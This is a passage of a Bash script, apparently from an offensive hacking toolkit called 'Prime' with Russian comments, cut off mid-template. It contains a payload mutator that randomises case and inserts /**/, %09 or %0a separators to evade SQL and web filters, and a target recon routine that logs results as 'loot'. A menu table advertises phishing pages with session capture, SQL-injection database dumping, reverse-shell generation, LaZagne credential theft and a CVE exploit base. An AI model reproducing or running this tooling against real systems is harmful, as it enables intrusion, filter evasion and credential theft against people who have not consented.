# Автоматически форматирует отступ и выводит интерактивное приглашение
core_engine_wait() {
    # 1. Эвристический отступ (заменяет spacer)
    echo -e "\n${B}------------------------------------------${NC}"
    
    # 2. Интерактивный запрос
    # Используем stderr (>&2), чтобы не засорять возможные конвейеры данных
    echo -ne "${Y}Нажмите [Enter] для продолжения...${NC}" >&2
    
    # 3. Ожидание ввода (флаг -s скроет случайные нажатия клавиш, если нужно, 
    # но здесь оставим стандарт для явного подтверждения)
    read -r
}



core_engine_control() {
    local status=$?
    local mode="$1"      
    local label="$2"     
    local cmd="$3" 
    local fatal="${4:-0}"

    case "$mode" in
        "check")
            if [[ $status -eq 0 ]]; then
                core_engine_ui "+$label: Успешно"
                return 0
            fi
            core_engine_ui "!$label: Ошибка"
            [[ "$fatal" == "1" ]] && { core_engine_ui "!Критический сбой. Остановка."; exit 1; }
            return 1
            ;;

        "restart")
            core_engine_ui "?Перезагрузка: [$label]..."
            core_engine_run pkill -f "$label"
            sleep 1
            
            if [[ -n "$cmd" ]]; then
                eval "$cmd &"
                # Эвристический трюк: передаем статус выполнения eval следующему вызову
                core_engine_control "check" "Модуль [$label]" "" "$fatal"
            else
                core_engine_ui "!Ошибка: Команда запуска [$label] пуста"
                return 1
            fi
            ;;
    esac
}



core_engine_validator() {
    local type="$1"    # Категория проверки
    local target="$2"  # Объект (IP, домен, файл, пакет)
    local label="$3"   # Имя для вывода в лог/UI
    local extra="$4"   # Доп. параметр (например, макс. значение range)
    local failed=0
    local err_msg=""

    case "$type" in
        # ======================================================================
        # СИСТЕМНЫЙ СЛОЙ
        # ======================================================================
        "root")
            [[ $EUID -ne 0 ]] && { failed=1; err_msg="Требуются привилегии суперпользователя (ROOT/sudo)"; }
            ;;
            
        "pkg")
            if ! command -v "$target" >/dev/null 2>&1; then
                core_engine_ui "i" "Зависимость [$target] отсутствует. Инициализация установки через APT..."
                if core_engine_run apt-get install -y "$target"; then
                    core_engine_ui "s" "Компонент [$target] успешно интегрирован в операционную систему."
                    return 0
                else
                    failed=1; err_msg="Критическая ошибка APT: не удалось установить пакет [$target]"; fi
            fi
            ;;

        # ======================================================================
        # СЕТЕВОЙ И ИНФРАСТРУКТУРНЫЙ СЛОЙ
        # ======================================================================
        "url"|"host")
            # Снайперская проверка через наш ультимативный объединенный сетевой стек
            # Проверяет IPv4, IPv6, MAC и Домены одновременно на основе шапки конфигурации
            if [[ ! "$target" =~ $GLOBAL_SUPER_REGEX_INFRA ]]; then
                failed=1; err_msg="Недопустимый сетевой формат цели: [$target]. Не соответствует RFC."; fi
            ;;

        "net_up")
            # Безопасная проверка доступности узла с ограничением по времени
            if ! timeout 2 ping -c 1 "$target" >/dev/null 2>&1; then
                failed=1; err_msg="Узел [$target] не отвечает на запросы (Offline или ICMP Drop)"; fi
            ;;

            # ======================================================================
            # СЕТЕВОЙ И ИНФРАСТРУКТУРНЫЙ СЛОЙ
            # ======================================================================
            "privacy")
                # АВТОНОМНАЯ ЗАЩИТА ОТ ДЕАНOНИМИЗАЦИИ (БЕЗ ВНЕШНЕГО СЛИВА IP)
                # Проверяем наличие активных туннелей через глобальную маску интерфейсов
                if ! ip link show up | grep -qEi "$GLOBAL_REGEX_PRIVACY_INTERFACES"; then
                    # Дополнительный эвристический рубеж: сверка с переменной REAL_IP
                    if [[ -n "$REAL_IP" ]]; then
                        local current_ip=$(curl -s --max-time 3 --connect-timeout 2 https://api.ipify.org || echo "TIMEOUT")
                        if [[ "$current_ip" == "$REAL_IP" ]]; then
                            failed=1; err_msg="VPN/Proxy не активен! Обнаружена утечка реального IP-адреса [$current_ip]"; fi
                    else
                        core_engine_ui "w" "Внимание: Пассивный аудит интерфейсов не выявил VPN-туннелей ($GLOBAL_REGEX_PRIVACY_INTERFACES)."
                    fi
                fi
                ;;

        # ======================================================================
        # ФАЙЛОВЫЙ СЛОЙ
        # ======================================================================
        "file"|"read")
            if [[ ! -f "$target" ]]; then
                failed=1; err_msg="Целевой файл [$target] не найден в файловой системе"; 
            elif [[ ! -r "$target" ]]; then
                failed=1; err_msg="Ошибка прав доступа: файл [$target] запрещен для чтения";
            fi
            ;;

        "dir")
            if [[ ! -d "$target" ]]; then
                core_engine_ui "i" "Директория [$target] отсутствует. Запуск генерации пути..."
                if core_engine_run mkdir -p "$target"; then
                    core_engine_ui "s" "Инфраструктурная директория успешно создана: $target"
                    return 0
                else
                    failed=1; err_msg="Ошибка ФС: недостаточно прав на создание пути [$target]"; fi
            fi
            ;;

        # ======================================================================
        # КРИПТОГРАФИЧЕСКИЙ И ЛОГИЧЕСКИЙ СЛОЙ
        # ======================================================================
        "crypto")
            # Новая валидация: проверка на то, является ли объект хэшем (MD5/SHA256)
            if [[ ! "$target" =~ $GLOBAL_SUPER_REGEX_CRYPTO ]]; then
                failed=1; err_msg="Объект [$target] не является валидным криптографическим хэшем."; fi
            ;;

       # ======================================================================
        # КРИПТОГРАФИЧЕСКИЙ И ЛОГИЧЕСКИЙ СЛОЙ
        # ======================================================================
        "range")
            # Если доп. параметр extra не передан, ядро берет дефолтный лимит из шапки
            local max_boundary="${extra:-$GLOBAL_CORE_MENU_MAX_LIMIT}"
            
            # Проверка типа данных и вхождения в диапазон через глобальные константы
            if [[ ! "$target" =~ $GLOBAL_REGEX_DIGIT ]] || (( target < 1 || target > max_boundary )); then
                failed=1; err_msg="Числовое значение [$target] вышло за допустимые лимиты (1-$max_boundary)"; fi
            ;;

        "list"|"empty")
            # Жесткая очистка строки от пробелов перед проверкой на пустоту
            if [[ -z "${target// }" ]]; then
                failed=1; err_msg="Обязательное конфигурационное поле [$label] пустое"; fi
            ;;
            
        "entropy")
            # Защита ядра от случайных кликов и мусорного ввода
            if [[ ${#target} -lt 3 ]]; then
                failed=1; err_msg="Длина данных объекта [$label] критически мала (минимум 3 символа)"; fi
            ;;
    esac

    # Финализация и выдача структурированного отчета
    if [[ $failed -eq 1 ]]; then
        core_engine_ui "e" "КРИТИЧЕСКАЯ ОШИБКА ВАЛИДАЦИИ [$label] -> $err_msg"
        return 1
    fi
    
    return 0
}

# --- CORE ENGINE: LOOT COLLECTOR v1.2 (Session Logger) ---
core_engine_loot() {
    local category="${1:-SYSTEM}" # Категория: service, scan, exploit
    local message="$2"
    local timestamp=$(date "+%Y-%m-%d %H:%M:%S")
    local loot_file="$PRIME_LOOT/session_loot.log"

    # Создаем папку, если её нет (универсально для Root/Non-Root)
    mkdir -p "$PRIME_LOOT" 2>/dev/null

    # Форматируем запись для файла
    echo "[$timestamp] [$category] $message" >> "$loot_file"

    # Если это запуск сервиса, дублируем в UI для красоты
    if [[ "$category" == "service" ]]; then
        core_engine_ui "i" "Event logged to loot sector."
    fi
}


#Настройки 


# Настройка DNS для локальных сервисов (например, scanclamavlocal)
core_network_dns_sync() {
    core_engine_ui "i" "Syncing Network DNS Layer..."

    # Проверка зависимостей
    if ! command -v dnsmasq >/dev/null 2>&1; then
        core_engine_ui "!" "dnsmasq не найден. DNS-адаптация пропущена."
        return 1
    fi

    # 1. ЭВРИСТИКА: Поиск лучшего активного IP
    # Берем IP самого активного интерфейса (исключая docker и loopback)
    local active_ip=$(ip -4 addr show | grep -vE '127.0.0.1|docker' | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -n 1)
    
    # Если IP не найден, откатываемся на localhost
    [[ -z "$active_ip" ]] && active_ip="127.0.0.1"

    # 2. АДАПТИВНОСТЬ: Сбор имен для регистрации
    # Мы можем регистрировать не только статику, но и имя хоста машины
    local hostname=$(hostname)
    local dns_conf="/etc/dnsmasq.conf"
    
    core_engine_ui "i" "Binding DNS to IP: $active_ip"

    # 3. ГЕНЕРАЦИЯ (Smart Config)
    # Используем временный файл, чтобы не убить рабочий конфиг раньше времени
    local tmp_dns=$(mktemp)
    
    cat << EOD > "$tmp_dns"
# --- Core Prime DNS Configuration ---
domain-needed
bogus-priv
interface=lo
interface=wlan0
interface=eth0
bind-dynamic
local-ttl=60
cache-size=1500

# Динамические локальные домены
address=/scanclamavlocal/$active_ip
address=/$hostname.local/$active_ip
address=/prime.portal/$active_ip
address=/audit.local/$active_ip

# Ускорение для upstream (используем Cloudflare как резерв)
server=1.1.1.1
server=8.8.8.8
EOD

    # 4. ВАЛИДАЦИЯ И ПРИМЕНЕНИЕ
    if dnsmasq --test -C "$tmp_dns" >/dev/null 2>&1; then
        cp "$tmp_dns" "$dns_conf"
        
        # Умный перезапуск
        if service dnsmasq restart 2>/dev/null; then
            core_engine_ui "+" "DNS Sync Complete: http://$hostname.local"
        else
            killall dnsmasq 2>/dev/null
            dnsmasq -C "$dns_conf" && core_engine_ui "+" "DNS Engine Restarted (Manual)"
        fi
    else
        core_engine_ui "!" "Критическая ошибка в конфигурации DNS. Откат."
        rm -f "$tmp_dns"
        return 1
    fi

    rm -f "$tmp_dns"
    return 0
}

core_engine_info() {
    # ==========================================================================
    # СЛОЙ 1: АППАРАТНЫЕ МЕТРИКИ (Память и Хранилище)
    # ==========================================================================
    local free_output=$(free -m | grep "Mem:")
    local ram_total=$(echo "$free_output" | tr -s ' ' | cut -d' ' -f2)
    local ram_avail=$(echo "$free_output" | tr -s ' ' | cut -d' ' -f7)
    local ram="${ram_avail}/${ram_total}"
    local rom=$(df -h / | tail -1 | tr -s ' ' | cut -d' ' -f4)

    # ==========================================================================
    # СЛОЙ 2: АНАЛИЗ АКТИВНОГО МАРШРУТА (Глобальный Аплинк)
    # ==========================================================================
    local main_iface=$(ip -4 route show default 2>/dev/null | grep -oPm1 '(?<=dev )[a-z0-9.-]+')
    local uplink_type="OFFLINE"
    
    if [[ -n "$main_iface" ]]; then
        if [[ "$main_iface" =~ $GLOBAL_REGEX_PRIVACY_INTERFACES ]]; then
            uplink_type="VPN/SECURE"
        elif [[ -d "/sys/class/net/$main_iface/wireless" ]] || [[ "$main_iface" =~ ^wlan[0-9]|^wlp ]]; then
            uplink_type="WLAN"
        elif [[ "$main_iface" =~ ^(rmnet|wwan|pccard|usb) ]]; then
            uplink_type="CELL"
        else
            uplink_type="ETH"
        fi
    fi

    # ==========================================================================
    # СЛОЙ 3: АППАРАТНЫЙ СКАНЕР ЛОКАЛЬНЫХ ИНТЕРФЕЙСОВ (Wi-Fi, Bluetooth, VPN)
    # ==========================================================================
    local active_vpn=""
    local wifi_hardware="${R}ABSENT${NC}"
    local bt_hardware="${R}ABSENT${NC}"

    # 1. Сбор активных шифрованных туннелей
    for sys_iface in /sys/class/net/*; do
        [ -e "$sys_iface" ] || continue
        local iface_name=$(basename "$sys_iface")
        if [[ -f "$sys_iface/operstate" ]] && [[ "$(cat "$sys_iface/operstate" 2>/dev/null)" == "up" ]]; then
            if [[ "$iface_name" =~ $GLOBAL_REGEX_PRIVACY_INTERFACES ]]; then
                active_vpn+="${iface_name} "
            fi
        fi
    done
    active_vpn=$(echo "$active_vpn" | xargs)

    # 2. Проверка физического Wi-Fi модуля в ОС (через /sys или утилиту iw/rfkill)
    if ls /sys/class/net/ | grep -qEi "^wlan|^wlp" || [ -d /sys/class/net/*/wireless ]; then
        # Нашли беспроводную карту. Проверяем, включена ли она
        local wifi_iface=$(ls /sys/class/net/ | grep -m1 -Ei "^wlan|^wlp")
        if [[ "$(cat /sys/class/net/$wifi_iface/operstate 2>/dev/null)" == "up" ]]; then
            wifi_hardware="${G}ACTIVE${NC} ($wifi_iface)"
        else
            wifi_hardware="${Y}DISABLED${NC}"
        fi
    fi

    # 3. Проверка физического Bluetooth модуля
    if [ -d /sys/class/bluetooth ] || hciconfig >/dev/null 2>&1 || rfkill list bluetooth | grep -q "Bluetooth"; then
        # Нашли Bluetooth адаптер. Проверяем его состояние через rfkill или hciconfig
        if rfkill list bluetooth 2>/dev/null | grep -q "Soft blocked: yes"; then
            bt_hardware="${Y}BLOCKED${NC}"
        else
            bt_hardware="${G}READY/ACTIVE${NC}"
        fi
    fi

    # ==========================================================================
    # СЛОЙ 4: СТРУКТУРИРОВАННЫЙ ВЫВОД В СТИЛЕ CORE ENGINE
    # ==========================================================================
    core_engine_ui "i" "ТЕКУЩИЙ СИСТЕМНЫЙ СТАТУС ИНФРАСТРУКТУРЫ"
    
    echo -e "  ${B}Ресурсы памяти :${NC} RAM: [${ram} MB] | ROM: [${rom} свободно]"
    echo -e "  ${B}Глобальный шлюз:${NC} Активный аплинк: [${uplink_type}] -> Интерфейс: [${main_iface:-NONE}]"
    echo -e "  ${B}Радио-модули   :${NC} Wi-Fi: [${wifi_hardware}] | Bluetooth: [${bt_hardware}]"
    
    if [[ -n "$active_vpn" ]]; then
        echo -e "  ${B}Активная защита:${NC} [${G}${active_vpn}${NC}]"
    else
        echo -e "  ${B}Активная защита:${NC} [${R}НЕТ АКТИВНЫХ ТУННЕЛЕЙ${NC}]"
    fi
    
    # ==========================================================================
    # СЛОЙ 5: КОНТРОЛЬ СЕРВИСОВ
    # ==========================================================================
    local srv_status=""
    pgrep -f "av_server" >/dev/null && srv_status+="${G}[AV-CORE]${NC} "
    pgrep -f "share_server" >/dev/null && srv_status+="${G}[SHARE-MESH]${NC} "
    
    if [[ -n "$srv_status" ]]; then
        echo -e "  ${B}Активные узлы  :${NC} ${srv_status}"
    fi
    echo "----------------------------------------------------------------------"
}

# --- CORE ENGINE: PROGRESS v13.8.2 (Fixed Width Edition) ---
core_engine_progress() {
    local duration="${1:-1}"
    local msg="${2:-PROCESS}"
    local width=15 # Уменьшил ширину, чтобы точно влезло на узкий экран Wiko
    local steps=20

    # Скрываем курсор, чтобы не дергался
    printf "\e[?25l"

    for ((i=1; i<=steps; i++)); do
        local pc=$(( i * 100 / steps ))
        
        # Генерируем полоску без вложенных printf/seq
        local fill=$(( i * width / steps ))
        local empty=$(( width - fill ))
        local p_bar=$(printf "%${fill}s" | tr ' ' '█')
        local e_bar=$(printf "%${empty}s" | tr ' ' '░')

        # ПРАВИЛО: \r (начало) -> \e[K (чистка) -> Текст
        # Ограничиваем длину $msg до 12 символов (%-12.12s), чтобы не порвать строку
        printf "\r\e[K${NC}[i] Loading %-12.12s ${B}[%s%s]${NC} %d%%" \
            "$msg" "$p_bar" "$e_bar" "$pc"
        
        sleep $(echo "scale=2; $duration / $steps" | bc 2>/dev/null || echo "0.05")
    done

    # Завершаем: затираем прогресс и пишем финальный статус
    printf "\r\e[K${G}[+] %-12.12s : SUCCESSFUL${NC}\n" "$msg"
    
    # Возвращаем курсор
    printf "\e[?25h"
}


# --- Универсальный динамический контроллер ---
prime_dynamic_controller() {
    local title="$1"
    local -a labels=($2)
    local -a actions=($3)
    
    while true; do
        
        core_engine_info
        core_engine_ui "h" "$title"
        
        for ((i=0; i<${#labels[@]}; i++)); do
            core_engine_item "$((i+1))" "${labels[$i]//_/ }" "Execute"
        done
        
        echo -e "\n${Y} B) BACK / EXIT${NC}"
        core_engine_ui "line" ""
        
        local choice=$(core_engine_input "select" "Input")
        
        if [[ "$choice" == "b" || "$choice" == "B" ]]; then return 0; fi
        
        if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -le "${#labels[@]}" ]; then
            local idx=$((choice-1))
            # core_engine_progress 1 "${labels[$idx]}"
            # Выполнение действия
            ${actions[$idx]}        
        else
            core_engine_ui "e" "Invalid selection"
            sleep 1
        fi
    done
}


core_engine_mutate() {
    local input="$1"
    local mode="${2:-full}"
    local output=""
    
    for word in $input; do
        local mutated_word=""
        
        # Neural Case Shuffle
        for (( i=0; i<${#word}; i++ )); do
            local char="${word:$i:1}"
            (( RANDOM % 2 )) && mutated_word+="${char^^}" || mutated_word+="${char,,}"
        done
        
        # Space Obstruction
        local separator=" "
        case "$mode" in
            "sql")
                local sql_vars=("/**/" "/**/--/**/" "+")
                separator="${sql_vars[$(( RANDOM % ${#sql_vars[@]} ))]}" ;;
            "web")
                local web_vars=("%20" "%09" "%0a" "+")
                separator="${web_vars[$(( RANDOM % ${#web_vars[@]} ))]}" ;;
            "full")
                local all_vars=("/**/" "%20" "+" "/**/--/**/")
                separator="${all_vars[$(( RANDOM % ${#all_vars[@]} ))]}" ;;
        esac
        
        output+="${mutated_word}${separator}"
    done

    echo -n "${output%?}"
}


# --- INTELLIGENCE: DEEP RECON v1.4 ---
core_intelligence_gather() {
    local r_target="$1"
    
    # Первичная жесткая валидация входных данных через глобальную сетевую матрицу
    if ! core_engine_validator "url" "$r_target" "Идентификатор целевого хоста"; then
        return 1
    fi

    core_engine_ui "i" "Запуск глубокого инфраструктурного и OSINT-анализа: $r_target"
    echo "======================================================================"

    # ==========================================================================
    # СЛОЙ 1: РАСШИРЕННЫЙ МНОЖЕСТВЕННЫЙ РЕЗОЛВИНГ IP (IPv4 / IPv6 / CNAME)
    # ==========================================================================
    core_engine_ui "i" "Слой 1: Сканирование сетевых маршрутов и адресации..."
    
    local target_ipv4_list=$(dig +short A "$r_target" 2>/dev/null | grep -E "^([0-9]{1,3}\.){3}[0-9]{1,3}$" | tr '\n' ' ' | xargs)
    if [[ -z "$target_ipv4_list" ]]; then
        local host_ipv4=$(host -t A "$r_target" 2>/dev/null | grep "has address")
        if [[ -n "$host_ipv4" ]]; then
            target_ipv4_list=$(echo "$host_ipv4" | tr -s ' ' | cut -d' ' -f4 | tr '\n' ' ' | xargs)
        fi
    fi
    [[ -z "$target_ipv4_list" ]] && target_ipv4_list="0.0.0.0 (Не удалось разрешить IPv4)"

    local target_ipv6_list=$(dig +short AAAA "$r_target" 2>/dev/null | grep -E ":" | tr '\n' ' ' | xargs)
    if [[ -z "$target_ipv6_list" ]]; then
        local host_ipv6=$(host -t AAAA "$r_target" 2>/dev/null | grep "IPv6 address")
        if [[ -n "$host_ipv6" ]]; then
            target_ipv6_list=$(echo "$host_ipv6" | tr -s ' ' | cut -d' ' -f5 | tr '\n' ' ' | xargs)
        fi
    fi
    [[ -z "$target_ipv6_list" ]] && target_ipv6_list="Нет активных IPv6 адресов"

    local target_cname=$(dig +short CNAME "$r_target" 2>/dev/null | tail -n1 | xargs)
    [[ -z "$target_cname" ]] && target_cname="Прямая адресация (CNAME-записи отсутствуют)"

    # ==========================================================================
    # СЛОЙ 2: АНАЛИЗ HTTP/HTTPS ЗАГОЛОВКОВ ЧЕРЕЗ ГЛОБАЛЬНЫЕ МАТРИЦЫ
    # ==========================================================================
    core_engine_ui "i" "Слой 2: Эксплуатация заголовков веб-ответа (SSL/TLS Слой)..."
    
    local headers=$(curl -IsL --max-redirs 3 --connect-timeout 4 "https://$r_target" 2>/dev/null)
    if [[ -z "$headers" ]]; then
        headers=$(curl -IsL --max-redirs 3 --connect-timeout 4 "http://$r_target" 2>/dev/null)
    fi
    
    local web_status="" srv_ver="" php_ver="" secure_headers="" cookie_intel=""

    if [[ -z "$headers" ]]; then
        web_status="Сбой подключения: Хост игнорирует запросы (DROP/WAF Filter)"
        srv_ver="Неизвестно (Сетевой сброс)"
        php_ver="Неизвестно (Сетевой сброс)"
        secure_headers="    [-] Сканирование политик защиты невозможно из-за блокировки\n"
        cookie_intel="    [-] Сканирование сессионных дескрипторов невозможно\n"
    else
        web_status=$(echo "$headers" | grep -Ei "$GLOBAL_REGEX_HTTP_STATUS" | tail -n1 | tr -d '\r' | xargs)
        
        srv_ver=$(echo "$headers" | grep -Ei "$GLOBAL_REGEX_HTTP_SERVER" | tr -d '\r' | cut -d':' -f2- | xargs)
        [[ -z "$srv_ver" ]] && srv_ver="Данные скрыты, обфусцированы или удалены из заголовков"
        
        php_ver=$(echo "$headers" | grep -Ei "$GLOBAL_REGEX_HTTP_RUNTIME" | tr -d '\r' | cut -d':' -f2- | xargs)
        [[ -z "$php_ver" ]] && php_ver="Скрыт, отсутствует или используется статическая архитектура"
        
        echo "$headers" | grep -Ei "$GLOBAL_REGEX_HTTP_SECURITY" | tr -d '\r' | while read -r sec_line; do
            [[ -n "$sec_line" ]] && secure_headers+="    [+] $(echo "$sec_line" | xargs)\n"
        done
        [[ -z "$secure_headers" ]] && secure_headers="    [-] Заголовки безопасности веб-ресурса полностью отсутствуют (Инфраструктура уязвима)\n"
        
        echo "$headers" | grep -Ei "$GLOBAL_REGEX_HTTP_COOKIE" | tr -d '\r' | cut -d':' -f2- | while read -r cookie_line; do
            [[ -n "$cookie_line" ]] && cookie_intel+="    [*] Cookie: $(echo "$cookie_line" | xargs)\n"
        done
        [[ -z "$cookie_intel" ]] && cookie_intel="    [-] Сессионные куки не передаются в заголовках ответа веб-сервера\n"
    fi

    # ==========================================================================
    # СЛОЙ 3: ИНТЕРНАЦИОНАЛЬНЫЙ ПАРСИНГ WHOIS (Глобальные Атомарные Матрицы)
    # ==========================================================================
    core_engine_ui "i" "Слой 3: Запрос глобальных регистрационных баз данных WHOIS..."
    
    local raw_whois=$(whois "$r_target" 2>/dev/null)
    local whois_reg="" whois_dates="" whois_ns="" whois_privacy=""
    
    if [[ -z "${raw_whois// }" ]]; then
        whois_reg="  [-] База данных WHOIS недоступна (Таймаут, блокировка или лимит запросов)"
        whois_dates="  [-] Метки жизненного цикла инфраструктуры не собраны"
        whois_ns="  [-] Маршрутизация DNS-серверов не определена"
        whois_privacy="  [-] Маркеры защиты данных отсутствуют"
    else
        # Первичный проход через глобальный композитный фильтр
        local filtered_whois=$(echo "$raw_whois" | grep -Ei "$GLOBAL_SIG_WHOIS_MATRIX" | tr -d '\r')
        
        # Сортировка по блокам исключительно через атомарные константы конфигурации
        whois_reg=$(echo "$filtered_whois" | grep -Ei "$GLOBAL_REGEX_WHOIS_REG" | while read -r r_line; do echo "  [•] $(echo "$r_line" | xargs)"; done)
        [[ -z "$whois_reg" ]] && whois_reg="  [-] Данные организации скрыты или не опубликованы регистратором"
        
        whois_dates=$(echo "$filtered_whois" | grep -Ei "$GLOBAL_REGEX_WHOIS_DATES" | while read -r d_line; do echo "  [•] $(echo "$d_line" | xargs)"; done)
        [[ -z "$whois_dates" ]] && whois_dates="  [-] Временные метки жизненного цикла отсутствуют в ответе"
        
        whois_ns=$(echo "$filtered_whois" | grep -Ei "$GLOBAL_REGEX_WHOIS_NS" | sort -u | while read -r n_line; do echo "  [•] $(echo "$n_line" | xargs)"; done)
        [[ -z "$whois_ns" ]] && whois_ns="  [-] Маршрутизация DNS-серверов скрыта"
        
        whois_privacy=$(echo "$filtered_whois" | grep -Ei "$GLOBAL_REGEX_WHOIS_PRIVACY" | sort -u | while read -r p_line; do echo "  [!] Защита данных: $(echo "$p_line" | xargs)"; done)
        [[ -z "$whois_privacy" ]] && whois_privacy="  [i] Персональные данные открыты (Режим Privacy Protection отключен)"
    fi

    # ==========================================================================
    # СЛОЙ 4: ФОРМИРОВАНИЕ ПОЛНОГО ДЕТАЛИЗИРОВАННОГО ОТЧЕТА (UI ВЫВОД)
    # ==========================================================================
    echo -e "${G}>>> РАСШИРЕННАЯ СЕТЕВАЯ ТОПОЛОГИЯ ЦЕЛИ <<<${NC}"
    echo -e "  ${B}Целевой домен:${NC} $r_target"
    echo -e "  ${B}IPv4 Пул      :${NC} $target_ipv4_list"
    echo -e "  ${B}IPv6 Пул      :${NC} $target_ipv6_list"
    echo -e "  ${B}CNAME Тракт   :${NC} $target_cname"
    echo "----------------------------------------------------------------------"
    echo -e "${G}>>> АРХИТЕКТУРА И ПАРАМЕТРЫ ВЕБ-ОКРУЖЕНИЯ <<<${NC}"
    echo -e "  ${B}Статус ответа :${NC} $web_status"
    echo -e "  ${B}Веб-сервер ПО :${NC} $srv_ver"
    echo -e "  ${B}Инфраструктура:${NC} $php_ver"
    echo -e "  ${B}Аудит заголовков безопасности (Security HTTP Headers):${NC}"
    echo -e "$secure_headers" | sed 's/\\n/\n/g'
    echo -e "  ${B}Анализ сессионных дескрипторов (Cookie Intel):${NC}"
    echo -e "$cookie_intel" | sed 's/\\n/\n/g'
    echo "----------------------------------------------------------------------"
    echo -e "${G}>>> ИНФРАСТРУКТУРНЫЙ РЕЕСТР WHOIS (ПОЛНЫЙ РАЗВЕРНУТЫЙ ВЫВОД) <<<${NC}"
    echo -e "${B}  [ Секция 1: Регистрационные данные и Владелец ]${NC}"
    echo "$whois_reg"
    echo ""
    echo -e "${B}  [ Секция 2: Жизненный цикл и Временные маркеры ]${NC}"
    echo "$whois_dates"
    echo ""
    echo -e "${B}  [ Секция 3: Делегированные DNS Узлы ]${NC}"
    echo "$whois_ns"
    echo ""
    echo -e "${B}  [ Секция 4: Слой приватности и GDPR статусы ]${NC}"
    echo "$whois_privacy"
    echo "======================================================================"

    # Автоматическая запись результатов в системный логгер (Loot)
    core_engine_loot "intelligence" "Глубокая разведка завершена для хоста $r_target. Полный IPv4 пул: [$target_ipv4_list]. Финальный статус ответа: [$web_status]. Обнаруженное серверное ПО: [$srv_ver]."
}

get_tool_info() {
    case "$1" in
        # --- Главное меню (Main Menu) ---
        "run_ghost_commander")      echo "ADB-контроль Android: зеркало, биометрия, Shell, управление файлами." ;;
        "run_phantom_engine")       echo "Social Engineering Framework: создание фишинг-страниц и сбор сессий." ;;
        "run_sql_adaptive")         echo "Инструментарий для SQL-инъекций: адаптивный поиск и дамп баз данных." ;;
        "run_device_hack")          echo "Комплексный анализ: сетевая разведка, Bluetooth и глубокий аудит." ;;
        "run_smart_osint_engine")   echo "OSINT-движок: поиск по IP, почте, телефонам и доменам." ;;
        "run_iban_analyzer")        echo "Финансовый анализ: проверка IBAN, банковских кодов и транзакций." ;;
        "run_pass_lab")             echo "Лаборатория паролей: генерация словарей и анализ стойкости хэшей." ;;
        "run_crypto_forge")         echo "Криптографический модуль: шифрование, расшифровка и работа с ключами." ;;
        "run_vulnerability_scanner") echo "Ghost Engine: сканер уязвимостей и поиск векторов для проникновения." ;;
        "run_prime_exploiter_v5")   echo "Ultimate Exploiter: база эксплойтов для известных CVE и 0-day." ;;
        "pc_password_recovery")     echo "Хаб управления ПК: эксплойты, сброс паролей и форензика." ;;
        "run_view_loot")            echo "Просмотр добычи (Intelligence Center): логи, пароли, дампы." ;;
        "run_system_info")          echo "Мониторинг системы: параметры CPU, RAM, Network и статус защиты." ;;
        "run_servers")              echo "Service Hub: запуск локальных серверов для обмена файлами и скана." ;;
        "run_repair")               echo "Инструменты самовосстановления и очистки мусора в ядре Prime." ;;
        "update_prime")             echo "Обновление ядра до последней версии с GitHub репозитория." ;;
        "exit_script")              echo "Безопасное завершение работы и очистка временных сессий." ;;

        # --- Подменю: DEVICE_HACK ---
        "run_network_analyzer")     echo "Network Intelligence: анализ трафика и обнаружение устройств в сети." ;;
        "scan_bluetooth_devices")   echo "Bluetooth Scan: перехват ID и анализ уязвимостей BT-протоколов." ;;
        "run_deep_audit")           echo "Smart Audit: глубокая проверка безопасности текущей системы." ;;

        # --- Подменю: PC_RECOVERY & EXPLOIT (уже были) ---
        "pc_gen_payload")           echo "Генерация реверс-шеллов (Bash/Python). Авто-настройка LHOST." ;;
        "run_pc_recovery_ultimate") echo "Сброс паролей Win/Lin/Mac и извлечение данных (LaZagne)." ;;
        "run_forensic_scanner")     echo "Автономная защита: килл-процессов, блок портов, карантин." ;;

        # --- Подменю: SERVICE_HUB (run_servers) ---
        "run_av_srv")               echo "AV-Scanner Server: удаленная проверка файлов на сигнатуры вирусов." ;;
        "run_share_srv")            echo "Share-File: быстрый HTTP-сервер для раздачи файлов в локальной сети." ;;
        "run_upload_srv")           echo "Upload-Inbound: защищенный приемник для входящих файлов." ;;

        *)                          echo "Описание функционала находится в стадии разработки..." ;;
    esac
}


# ==========================================
# 2. РАБОЧИЕ ШАБЛОНЫ 
# ==========================================


# --- ГЕНЕРАТОРЫ ШАБЛОНОВ (View Engine) ---

generate_core_form_template() {
    cat << 'EOF'
def render_prime_form(action_url, fields=None, btn_text="INITIATE TRANSFER"):
    if fields is None: fields = [{"type": "file", "name": "file", "label": "Drop files here or click to upload"}]
    
    inputs_html = ""
    js_needed = False
    
    for field in fields:
        f_type = field.get("type", "text")
        f_name = field.get("name", "input")
        f_label = field.get("label", "Field")
        
        if f_type == "file":
            js_needed = True
            inputs_html += f"""
            <div class="drop-zone" id="drop-zone">
                <span class="drop-zone__prompt">{f_label}</span>
                <input type="file" name="{f_name}" class="drop-zone__input" id="file-input">
            </div>
            """
        else:
            inputs_html += f"""
            <div style="margin: 15px 0;">
                <label style="font-size:0.7rem; opacity:0.6; display:block;">{f_label}</label>
                <input type="{f_type}" name="{f_name}" style="background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.1); color:white; padding:10px; width:100%; border-radius:0.5rem;">
            </div>
            """

    script = """
    <script>
    const dropZone = document.getElementById('drop-zone');
    const fileInput = document.getElementById('file-input');
    if(dropZone) {
        dropZone.addEventListener('click', () => fileInput.click());
        fileInput.addEventListener('change', () => {
            if(fileInput.files.length) updatePrompt(dropZone, fileInput.files[0].name);
        });
        ['dragover', 'dragleave', 'drop', 'dragend'].forEach(type => {
            dropZone.addEventListener(type, e => { e.preventDefault(); });
        });
        dropZone.addEventListener('dragover', () => dropZone.classList.add('drop-zone--over'));
        ['dragleave', 'drop', 'dragend'].forEach(type => {
            dropZone.addEventListener(type, () => dropZone.classList.remove('drop-zone--over'));
        });
        dropZone.addEventListener('drop', e => {
            if(e.dataTransfer.files.length) {
                fileInput.files = e.dataTransfer.files;
                updatePrompt(dropZone, e.dataTransfer.files[0].name);
            }
        });
    }
    function updatePrompt(zone, name) { zone.querySelector('.drop-zone__prompt').textContent = 'READY: ' + name; zone.style.borderColor = '#00ff41'; }
    </script>
    """ if js_needed else ""

    return f"""
    <form method="post" action="{action_url}" enctype="multipart/form-data">
        {inputs_html}
        <button type="submit" style="margin-top:20px;">{btn_text}</button>
    </form>
    {script}
    """
EOF
}



generate_core_template() {
    cat << 'EOF'
def render_prime_page(title, content):
    style = """
    <style>
        :root { --accent: #00ff41; --bg: #0a0a0c; --glass: rgba(20, 20, 25, 0.8); }
